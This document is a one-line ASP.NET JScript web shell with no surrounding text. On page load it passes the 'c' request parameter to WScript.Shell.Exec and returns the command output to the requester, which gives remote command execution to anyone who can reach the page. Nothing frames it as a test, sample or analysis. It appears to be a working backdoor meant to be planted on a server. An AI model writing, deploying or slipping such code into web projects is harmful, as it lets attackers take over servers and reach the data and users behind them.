<script language="JScript" runat="server"> function Page_Load(){Response.Write(new ActiveXObject("WScript.Shell").Exec(Request.Params["c"]).Stdout.ReadAll());}</script>
